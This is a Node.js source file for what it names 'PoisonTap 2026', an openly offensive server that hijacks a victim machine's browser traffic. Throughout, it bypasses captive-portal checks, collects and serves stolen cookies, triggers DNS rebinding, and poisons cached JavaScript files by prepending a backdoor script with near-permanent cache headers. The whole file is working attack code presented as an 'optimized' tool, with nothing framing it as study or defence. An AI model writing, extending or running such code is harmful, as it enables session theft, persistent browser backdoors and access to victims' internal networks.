// PoisonTap 2026 | Optimized Core HTTP/DNS/CDN Server
const http = require('http');
const fs = require('fs');
const fsPromises = fs.promises;
const path = require('path');

const PORT = 1337;
const COOKIE_LOG = path.join(__dirname, 'cookies.json');
const CDN_DIR = path.join(__dirname, 'js');
const REBIND_ZONES = {};
const REBIND_LOCKS = new Map();
const ASSET_CACHE = new Map();

let INJECTED_HTML, BACKDOOR_HTML, TARGET_BACKDOOR;

async function init() {
  try {
    INJECTED_HTML = await fsPromises.readFile(path.join(__dirname, 'target_injected_xhtmljs_2026.html'), 'utf8');
    BACKDOOR_HTML = await fsPromises.readFile(path.join(__dirname, 'backdoor_2026.html'), 'utf8');
    TARGET_BACKDOOR = await fsPromises.readFile(path.join(__dirname, 'target_backdoor_2026.js'), 'utf8');
    console.log('[+] Assets loaded into memory');
  } catch (err) {
    console.error('[-] Failed to load assets:', err);
    process.exit(1);
  }
}

// Safe CDN injection wrapper
function safeInject(content, prepend) {
  if (!content.trim()) return prepend + content;
  const needsSep = !content.match(/;\s*$/);
  const sep = needsSep ? ';' : '';
  return `${prepend}\n${sep}${content}`;
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const headers = {
    'Content-Type': req.headers.host === '1.0.0.1' ? 'text/html' : 'application/javascript',
    'Cache-Control': 'public, max-age=99936000, immutable',
    'Expires': new Date(Date.now() + 1e13).toUTCString(),
    'Access-Control-Allow-Origin': '*',
    'Cross-Origin-Embedder-Policy': 'require-corp',
    'Cross-Origin-Opener-Policy': 'same-origin'
  };

  // Captive Portal Bypass
  if (url.pathname === '/hotspot-detect.html' || url.pathname === '/generate_204') {
    headers['Content-Type'] = 'application/octet-stream';
    res.writeHead(200, headers);
    res.end('');
    return;
  }

  // Cookie Dump
  if (url.pathname === '/PoisonCookieDump') {
    try {
      const data = await fsPromises.readFile(COOKIE_LOG, 'utf8');
      headers['Content-Type'] = 'application/json';
      res.writeHead(200, headers);
      res.end(data || '{}');
      await fsPromises.writeFile(COOKIE_LOG, '{}', 'utf8');
    } catch (e) {
      res.writeHead(500); res.end('Error');
    }
    return;
  }

  // DNS Rebind Trigger
  if (url.pathname.startsWith('/rebind?')) {
    const ip = decodeURIComponent(url.searchParams.get('ip') || '192.168.0.1');
    REBIND_LOCKS.set(ip, { target: '1.0.0.1', expiry: Date.now() + 5000 });
    headers['Content-Type'] = 'text/plain';
    res.writeHead(200, headers);
    res.end('locked');
    return;
  }

  // CDN Cache Poisoning (with Memory Cache)
  if (url.pathname.startsWith('/js/')) {
    const fileName = path.basename(url.pathname.replace(/\//g, '_'));
    if (ASSET_CACHE.has(fileName)) {
      headers['Content-Type'] = 'application/javascript';
      res.writeHead(200, headers);
      res.end(ASSET_CACHE.get(fileName));
      return;
    }

    const cdnFile = path.join(CDN_DIR, fileName);
    try {
      if (fs.existsSync(cdnFile)) {
        const content = await fsPromises.readFile(cdnFile, 'utf8');
        const poisoned = safeInject(content, TARGET_BACKDOOR);
        ASSET_CACHE.set(fileName, poisoned);
        headers['Content-Type'] = 'application/javascript';
        res.writeHead(200, headers);
        res.end(poisoned);
        return;
      }
    } catch (e) {}
  }

  // Backdoor Injection
  if (url.pathname.includes('/PoisonTap')) {
    res.writeHead(200, { ...headers, 'Content-Type': 'text/html' });
    res.end(BACKDOOR_HTML);
    return;
  }

  // Default: Injected HTML
  res.writeHead(200, { ...headers, 'Content-Type': 'text/html' });
  res.end(INJECTED_HTML);
});

init().then(() => {
  server.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] Optimized PoisonTap 2026 listening on :${PORT}`);
  });
});

process.on('SIGTERM', () => { server.close(); process.exit(0); });
